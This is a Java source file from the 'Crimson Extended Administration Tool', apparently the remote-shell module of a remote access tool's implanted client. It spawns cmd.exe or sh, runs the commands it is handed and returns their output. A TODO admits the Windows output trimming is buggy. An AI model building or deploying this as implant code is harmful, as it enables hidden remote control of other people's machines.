/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage2.modules;



import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.Random;

import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.Reporter;

public class Shell {

	public static ArrayList<Shell> shells = new ArrayList<Shell>();

	Process process = null;
	BufferedReader reader;
	BufferedWriter writer;

	public int shellId;

	public static int randId() {
		return new Random().nextInt(1000000000);
	}

	public Shell() {
		// determine shell id
		shellId = randId();
		shells.add(this);

	}

	public void initialize() {

		if (Platform.windows) {
			// initialize the process
			try {
				ProcessBuilder builder = new ProcessBuilder("cmd.exe");
				builder.redirectErrorStream(true);
				process = builder.start();

				writer = new BufferedWriter(new OutputStreamWriter(process.getOutputStream()));
				reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				Reporter.report(e);
			}
		} else {
			// assuming unix

			try {
				ProcessBuilder builder = new ProcessBuilder("sh");
				builder.redirectErrorStream(true);
				process = builder.start();

				writer = new BufferedWriter(new OutputStreamWriter(process.getOutputStream()));
				reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				Reporter.report(e);
			}

		}

	}

	public String[] run(String c) {

		// Logger.add("Running: " + c);
		if (process == null) {
			System.out.println("Uninitialized shell!");
			return null;
		}
		String command = "";
		try {
			command = "((" + c.trim() + ") && echo {ENDOFINPUTIDENTIFIER}) || echo {ENDOFINPUTIDENTIFIER}\n";
			// Logger.add("Command: [" + command + "]");
			writer.write(command);
			writer.flush();

		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		ArrayList<String> output = new ArrayList<String>();

		try {

			String line = reader.readLine();
			while (!line.equals("{ENDOFINPUTIDENTIFIER}")) {
				// Logger.add("Read line of output \"" + line + "\"");
				output.add(line);
				line = reader.readLine();

			}

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		if (Platform.windows) {

			// remove anything before and the prompt line
			while (true) {
				String removal = output.remove(0);
				// Logger.add("Removed from output: " + removal);
				// Logger.add("Checking if contains: && echo {ENDOFINPUTIDENTIFIER}) || echo {ENDOFINPUTIDENTIFIER}");
				if (removal.contains("&& echo {ENDOFINPUTIDENTIFIER}) || echo {ENDOFINPUTIDENTIFIER}")) {// TODO
																											// figure
																											// out
																											// why
																											// this
																											// removes
																											// all
																											// data
																											// from
																											// output
					break;// that was the prompt line
				}
			}
		}

		String[] finaldata = new String[output.size()];
		for (int i = 0; i < finaldata.length; i++) {
			finaldata[i] = output.remove(0);

		}

		return finaldata;

	}

	public void close() {
		process.destroy();
		shells.remove(this);
		Logger.add("Shell Process killed");

	}

}
